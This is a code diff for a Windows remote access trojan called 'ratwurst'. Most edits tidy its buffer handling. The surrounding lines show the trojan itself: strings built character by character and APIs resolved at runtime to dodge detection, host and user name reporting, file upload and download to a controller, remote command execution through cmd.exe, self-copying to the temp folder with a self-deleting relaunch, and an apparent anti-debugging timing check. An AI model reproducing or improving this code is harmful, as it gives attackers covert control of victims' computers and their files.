@@ -1,9 +1,4 @@
-#include <winsock2.h>
-#include <Windows.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <time.h>
+
 
 #include "ratwurst.h"
 #include "tools.cpp"
@@ -16,18 +11,18 @@ global _recv* gf_recv;
 global _CreateFileA* gf_CreateFileA;
 global _CloseHandle* gf_CloseHandle;
 
-struct RATSocket
+typedef struct RATSocket
 {
 	HMODULE libraryWinsock2;
 	SOCKET socketConnection;
 	_WSAGetLastError *f_WSAGetLastError;	
-};
+} RATSocket;
 
 int
 EncryptDecryptString(char* str, int bufferSize)
 {
 	int i = 0;
-	while(*str != NULL && i < bufferSize)
+	while(*str != 0 && i < bufferSize)
 	{
 		if ( *str != 0 )
 		{
@@ -39,8 +34,9 @@ EncryptDecryptString(char* str, int bufferSize)
 }
 
 int
-SocketSend(RATSocket* ratSocket, char*
-		   messageBuffer, unsigned int bufferSize)
+SocketSend(RATSocket* ratSocket,
+		   char* messageBuffer,
+		   unsigned int bufferSize)
 {
 	char ca_send[] = { 's','e','n','d', 0};
 	_send* f_send = (_send*)GetProcAddress(ratSocket->libraryWinsock2, ca_send);
@@ -57,7 +53,7 @@ SocketSend(RATSocket* ratSocket, char*
 	{
 #if DEBUG		
 		char buffer[SOCKET_BUFFER_SIZE];
-		sprintf_s(buffer, "Socket failed with error: %ld\n", ratSocket->f_WSAGetLastError());
+		sprintf_s(buffer, SOCKET_BUFFER_SIZE, "Socket failed with error: %ld\n", ratSocket->f_WSAGetLastError());
 		OutputDebugStringA(buffer);
 #endif		
 		return 1;
@@ -84,11 +80,11 @@ FetchInfo(RATSocket* ratSocket)
 	if ( f_GetComputerNameA(bufferComputer, &len) <= 0 )
 	{
 #if DEBUG		
-		sprintf_s(bufferError, "Could not get computer name: %ld\n", GetLastError());
+		sprintf_s(bufferError, SOCKET_BUFFER_SIZE, "Could not get computer name: %ld\n", GetLastError());
 		OutputDebugStringA(bufferError);
 #endif
 
-		strncpy_s(bufferComputer, ca_unknown, strlen(ca_unknown));
+		strncpy_s(bufferComputer, MAX_COMPUTERNAME_LENGTH + 1, ca_unknown, strlen(ca_unknown));
 	}
 
 	char ca_advapi32[] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0 };
@@ -107,15 +103,15 @@ FetchInfo(RATSocket* ratSocket)
 	if ( f_GetUserNameA(bufferUser, &len) <= 0 )
 	{
 #if DEBUG		
-		sprintf_s(bufferError, "Could not get username: %ld\n", GetLastError());
+		sprintf_s(bufferError, SOCKET_BUFFER_SIZE, "Could not get username: %ld\n", GetLastError());
 		OutputDebugStringA(bufferError);
 #endif		
 
-		strncpy_s(bufferUser, ca_unknown, strlen(ca_unknown));
+		strncpy_s(bufferUser, UNLEN + 1, ca_unknown, strlen(ca_unknown));
 	}
 
 	char bufferInfo[SOCKET_BUFFER_SIZE];
-	sprintf_s(bufferInfo, "%s:%s", bufferComputer, bufferUser);
+	sprintf_s(bufferInfo, SOCKET_BUFFER_SIZE, "%s:%s", bufferComputer, bufferUser);
 	SocketSend(ratSocket, bufferInfo, (unsigned int)strlen(bufferInfo));
 
 	return 0;
@@ -128,7 +124,7 @@ DownloadFile(RATSocket* ratSocket,
 	char* totalReceivedData = NULL;
 	int totalBytesRead = 0;
 			
-	char fileSizeBuffer[FILE_SIZE_DIGIT_SIZE] = {};
+	char fileSizeBuffer[FILE_SIZE_DIGIT_SIZE] = { 0 };
 	if ( gf_recv(ratSocket->socketConnection, fileSizeBuffer, FILE_SIZE_DIGIT_SIZE, 0) != SOCKET_ERROR )
 	{
 		int fileSize = atoi(fileSizeBuffer);
@@ -137,7 +133,7 @@ DownloadFile(RATSocket* ratSocket,
 				
 		for (;;)
 		{
-			char writeBuffer[SOCKET_BUFFER_SIZE] = {};
+			char writeBuffer[SOCKET_BUFFER_SIZE] = { 0 };
 			int bytesRead = gf_recv(ratSocket->socketConnection, writeBuffer, SOCKET_BUFFER_SIZE, 0);
 			if ( bytesRead != SOCKET_ERROR )
 			{
@@ -182,7 +178,7 @@ DownloadFile(RATSocket* ratSocket,
 
 #if DEBUG			
 	char buffer[256];
-	sprintf_s(buffer, "Bytes written: %ld\n", bytesWritten);
+	sprintf_s(buffer, 256, "Bytes written: %ld\n", bytesWritten);
 	OutputDebugStringA(buffer);
 #endif	
 	
@@ -206,7 +202,7 @@ UploadFile(RATSocket* ratSocket,
 									NULL);
 
 	DWORD fileSize = GetFileSize(fileHandle, NULL);
-	char fileSizeBuffer[FILE_SIZE_DIGIT_SIZE] = {};
+	char fileSizeBuffer[FILE_SIZE_DIGIT_SIZE] = { 0 };
 
 	_itoa_s(fileSize, fileSizeBuffer, FILE_SIZE_DIGIT_SIZE, 10);
 	
@@ -218,7 +214,7 @@ UploadFile(RATSocket* ratSocket,
 	{
 		for(;;)
 		{
-			char readBuffer[SOCKET_BUFFER_SIZE] = {};
+			char readBuffer[SOCKET_BUFFER_SIZE] = { 0 };
 
 			DWORD bytesRead;
 			BOOL readFileResult = ReadFile(fileHandle,
@@ -255,20 +251,21 @@ UploadFile(RATSocket* ratSocket,
 int RunCommandInProcess(char *commandToRun, int waitForProcess)
 {
 	PROCESS_INFORMATION pi;
-	STARTUPINFO si = { };
+	STARTUPINFO si = { 0 };
 	si.cb = sizeof(si);
 
-	char cmdPath[MAX_PATH+8];
+	int cmdPathSize = MAX_PATH+8;
+	char* cmdPath = (char*)calloc(cmdPathSize, sizeof(char));
 
 	char ca_GetSystemDirectoryA[] = { 'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A',0 };
 	_GetSystemDirectoryA* f_GetSystemDirectoryA = (_GetSystemDirectoryA*)GetProcAddress(gLibraryKernel32, ca_GetSystemDirectoryA);
 	f_GetSystemDirectoryA(cmdPath, MAX_PATH);
 
 	char ca_cmdexe[] = { '\\','c','m','d','.','e','x','e',0 };
-	strncat_s(cmdPath, ca_cmdexe, 8);
+	strncat_s(cmdPath, cmdPathSize, ca_cmdexe, 8);
 
 	char cmdArg[MAX_PATH + 8 + 3] = { '/','C',' ',0 };
-	strncat_s(cmdArg, commandToRun, strlen(commandToRun));
+	strncat_s(cmdArg, cmdPathSize, commandToRun, strlen(commandToRun));
 
 	char ca_CreateProcessA[] = { 'C','r','e','a','t','e','P','r','o','c','e','s','s','A',0 };
 	_CreateProcessA* f_CreateProcessA = (_CreateProcessA*)GetProcAddress(gLibraryKernel32, ca_CreateProcessA);
@@ -276,11 +273,12 @@ int RunCommandInProcess(char *commandToRun, int waitForProcess)
 	{
 #if DEBUG				
 		char bufferError[256];
-		sprintf_s(bufferError, "CreateProcess failed (%d).\n", GetLastError());
+		sprintf_s(bufferError, 256, "CreateProcess failed (%d).\n", GetLastError());
 		OutputDebugStringA(bufferError);
 #endif
 		return 1;
 	}
+	free(cmdPath);
 
 	if ( waitForProcess )
 	{
@@ -298,19 +296,19 @@ int
 ReceiveCmdCommand(RATSocket* ratSocket,
 				  char* splittedCommand[SPLIT_STRING_ARRAY_SIZE])
 {
-	char commandToRun[MAX_PATH] = {};
+	char commandToRun[MAX_PATH] = { 0 };
 
 	int commandIndex = 1;
 	while ( splittedCommand[commandIndex] != NULL )
 	{
-		strncat_s(commandToRun, splittedCommand[commandIndex], strlen(splittedCommand[commandIndex]));
-		strncat_s(commandToRun, " ", 1);
+		strncat_s(commandToRun, MAX_PATH, splittedCommand[commandIndex], strlen(splittedCommand[commandIndex]));
+		strncat_s(commandToRun, MAX_PATH, " ", 1);
 		commandIndex++;
 	}
 
-	char randomFileName[11] = {};
+	char randomFileName[11] = { 0 };
 	GenerateRandomString(randomFileName, 6);
-	strncat_s(randomFileName, ".tmp", 4);
+	strncat_s(randomFileName, 11, ".tmp", 4);
 
 	char tempPath[MAX_PATH];
 
@@ -320,10 +318,10 @@ ReceiveCmdCommand(RATSocket* ratSocket,
 	
 	char filePath[MAX_PATH];
 	strncpy_s(filePath, MAX_PATH, tempPath, strlen(tempPath));
-	strncat_s(filePath, randomFileName, 10);
+	strncat_s(filePath, MAX_PATH, randomFileName, 10);
 
-	strncat_s(commandToRun, " > ", 3);
-	strncat_s(commandToRun, filePath, strlen(tempPath) + 10);
+	strncat_s(commandToRun, MAX_PATH, " > ", 3);
+	strncat_s(commandToRun, MAX_PATH, filePath, strlen(tempPath) + 10);
 	
 	RunCommandInProcess(commandToRun, 1);
 
@@ -353,7 +351,7 @@ CopyAndRunFromTempFolder(char* currentPath, char* newPath)
 	{
 #if DEBUG
 		char buffer[256];
-		sprintf_s(buffer, "Failure in getting CopyFileA using GetProcAddress: %d\n", GetLastError());
+		sprintf_s(buffer, 256, "Failure in getting CopyFileA using GetProcAddress: %d\n", GetLastError());
 		OutputDebugStringA(buffer);
 #endif		
 	}
@@ -362,7 +360,7 @@ CopyAndRunFromTempFolder(char* currentPath, char* newPath)
 	{
 #if DEBUG
 		char buffer[256];
-		sprintf_s(buffer, "Failure in copying the file: %d\n", GetLastError());
+		sprintf_s(buffer, 256, "Failure in copying the file: %d\n", GetLastError());
 		OutputDebugStringA(buffer);
 #endif		
 	}
@@ -371,13 +369,14 @@ CopyAndRunFromTempFolder(char* currentPath, char* newPath)
 	//
 	char pingCommand[] = { 'p','i','n','g',' ','1','2','7','.','0','.','0','.','1',' ','&',' ','d','e','l',' ',0 };
 	size_t pingCommandLength = strlen(pingCommand);
-	char commandToRun[MAX_PATH * 2 + 30] = {};
-	strncpy_s(commandToRun, pingCommand, pingCommandLength);
-	strncat_s(commandToRun, currentPath, strlen(currentPath));
+	char commandToRun[MAX_PATH * 2 + 30] = { 0 };
+	int commandToRunSize = MAX_PATH * 2 + 30;
+	strncpy_s(commandToRun, commandToRunSize, pingCommand, pingCommandLength);
+	strncat_s(commandToRun, commandToRunSize, currentPath, strlen(currentPath));
 
 	char callCommand[] = { ' ','&',' ','c','a','l','l',' ',0 };
-	strncat_s(commandToRun, callCommand, strlen(currentPath));
-	strncat_s(commandToRun, newPath, strlen(newPath));
+	strncat_s(commandToRun, commandToRunSize, callCommand, strlen(currentPath));
+	strncat_s(commandToRun, commandToRunSize, newPath, strlen(newPath));
 		
 	RunCommandInProcess(commandToRun, 0);
 }
@@ -466,17 +465,20 @@ WinMain(HINSTANCE hInstance,
 #endif		
 	}
 
-	char tempPath[MAX_PATH] = {};
+	char tempPath[MAX_PATH] = { 0 };
 
 	char ca_GetTempPathA[] = { 'G','e','t','T','e','m','p','P','a','t','h','A',0 };
 	_GetTempPathA* f_GetTempPathA = (_GetTempPathA*)GetProcAddress(gLibraryKernel32, ca_GetTempPathA);
 	f_GetTempPathA(MAX_PATH, tempPath);
 
-	char execPath[MAX_PATH + 9] = {};
-	strncpy_s(execPath, MAX_PATH, tempPath, strlen(tempPath));
+
+	int execPathSize = MAX_PATH + 9;
+	char* execPath = (char*)calloc(execPathSize, sizeof(char));
+	
+	strncpy_s(execPath, execPathSize, tempPath, strlen(tempPath));
 
 	char ca_tmpName[] = { 'r','t','w','r','s','t','.','t','m','p',0 };
-	strncat_s(execPath, ca_tmpName, 9);
+	strncat_s(execPath, execPathSize, ca_tmpName, 9);
 
 #if DEBUG
 // #if !DEBUG	
@@ -489,6 +491,8 @@ WinMain(HINSTANCE hInstance,
 		CopyAndRunFromTempFolder(currentPath, execPath);
 		return 0;
 	}
+
+	free(execPath);
 	
 	UNREFERENCED_PARAMETER(hInstance);
 	UNREFERENCED_PARAMETER(hPrevInstance);
@@ -497,7 +501,7 @@ WinMain(HINSTANCE hInstance,
 	
 	srand( (unsigned)time( NULL ) );
 	
-	RATSocket ratSocket = {};
+	RATSocket ratSocket = { 0 };
 	
 	char ca_ws2_32[] = {'W','s','2','_','3','2','.','d','l','l', 0};
 	ratSocket.libraryWinsock2 = LoadLibraryA(ca_ws2_32);
@@ -548,7 +552,7 @@ WinMain(HINSTANCE hInstance,
 		{
 #if DEBUG					
 			char buffer[256];
-			sprintf_s(buffer, "Socket failed with error: %ld\n", ratSocket.f_WSAGetLastError());
+			sprintf_s(buffer, 256, "Socket failed with error: %ld\n", ratSocket.f_WSAGetLastError());
 			OutputDebugStringA(buffer);
 #endif			
 
@@ -585,7 +589,7 @@ WinMain(HINSTANCE hInstance,
 		{
 #if DEBUG					
 			char buffer[256];
-			sprintf_s(buffer, "Socket failed with error: %ld\nReconnecting...\n", ratSocket.f_WSAGetLastError());
+			sprintf_s(buffer, 256, "Socket failed with error: %ld\nReconnecting...\n", ratSocket.f_WSAGetLastError());
 			OutputDebugStringA(buffer);
 #endif			
 
@@ -607,7 +611,7 @@ WinMain(HINSTANCE hInstance,
 		cycleCountDiff = (performanceCounterCurrent.QuadPart - performanceCounterStart.QuadPart) / performanceFrequency.QuadPart;
 
 		char buffer[256];
-		sprintf_s(buffer, "Checking: %ld\n", cycleCountDiff);
+		sprintf_s(buffer, 256, "Checking: %ld\n", cycleCountDiff);
 		OutputDebugStringA(buffer);
 		
 		if ( cycleCountDiff > 20 )
@@ -637,7 +641,7 @@ WinMain(HINSTANCE hInstance,
 	
 	for(;;)
 	{
-		char recvBuffer[SOCKET_BUFFER_SIZE] = {};
+		char recvBuffer[SOCKET_BUFFER_SIZE] = { 0 };
 		if ( gf_recv(ratSocket.socketConnection, recvBuffer, SOCKET_BUFFER_SIZE, 0) == SOCKET_ERROR )
 		{
 #if DEBUG					
@@ -659,7 +663,7 @@ WinMain(HINSTANCE hInstance,
 		char ca_upload[] = { 'u','p','l','o','a','d',0 };
 		char ca_download[] = { 'd','o','w','n','l','o','a','d',0 };
 
-		char* splittedCommand[SPLIT_STRING_ARRAY_SIZE] = {};
+		char* splittedCommand[SPLIT_STRING_ARRAY_SIZE] = { 0 };
 		SplitString(recvBuffer, splittedCommand, " ");
 		
 		if ( strcmp(splittedCommand[0], ca_info) == 0 )
